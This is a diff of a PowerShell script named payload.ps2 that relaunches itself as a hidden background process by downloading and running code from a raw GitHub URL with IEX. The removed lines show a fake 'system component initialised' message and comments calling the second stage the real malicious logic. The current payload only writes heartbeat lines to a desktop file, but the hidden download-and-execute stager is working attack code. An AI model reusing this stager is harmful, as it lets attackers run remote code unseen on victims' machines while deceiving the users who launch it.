@@ -1,22 +1,12 @@
-# GitHub 內容: payload.ps2
-
-$url = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
-
-# 檢查目前是否為隱藏狀態 (或是檢查自定義標記)
+$u = "https://raw.githubusercontent.com/YZUs1121518/WATmidle/refs/heads/main/payload.ps2"
 if ($Args[0] -ne "SecondStage") {
-    # --- 第一階段：由使用者觸發 ---
-    # 這裡啟動一個新的、完全隱藏的背景進程，並傳入參數 "SecondStage"
-    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$url') SecondStage"
-    
-    # 顯示一個假的提示資訊後，讓目前的視窗快速關閉
-    Write-Host "系統組件初始化完成。" -ForegroundColor Green
-    Start-Sleep -Seconds 1
+    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('$u') SecondStage"
     exit
 }
 
-# --- 第二階段：真正的後台惡意邏輯 ---
-# 這裡寫你真正想在後台跑的動作 (例如：每 10 秒在桌面寫入一次)
-while($true) {
-    "Background process is running at $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\hidden_test.txt" -Append
-    Start-Sleep -Seconds 10
+$path = "$env:USERPROFILE\Desktop\hidden_active.txt"
+"Session started at $(Get-Date)" | Out-File -FilePath $path -Force
+for ($i=1; $i -le 10; $i++) {
+    "Heartbeat $i at $(Get-Date)" | Out-File -FilePath $path -Append
+    Start-Sleep -Seconds 5
 }
